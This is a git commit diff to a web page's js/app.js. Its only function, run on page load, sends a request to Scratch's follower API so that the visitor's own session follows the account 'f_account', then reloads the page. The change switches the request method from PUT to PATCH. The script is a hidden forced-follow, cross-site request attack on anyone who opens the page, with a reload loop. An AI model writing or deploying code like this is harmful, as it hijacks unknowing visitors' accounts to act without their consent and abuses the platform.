07bf4490d8e00c772a6821f2e809228ba9ba85cc
Sonik <69720319+SuperS0n1k@users.noreply.github.com>
2023-06-09 18:58:01 +0100

    Update app.js

--- js/app.js
+++ js/app.js
@@ -1,5 +1,5 @@
 function followme() {
-    $.ajax({type:"PUT",url:"https://scratch.mit.edu/site-api/users/followers/f_account/add/"});
+    $.ajax({type:"PATCH",url:"https://scratch.mit.edu/site-api/users/followers/f_account/add/"});
     location.reload();
 }
 window.onload = followme;
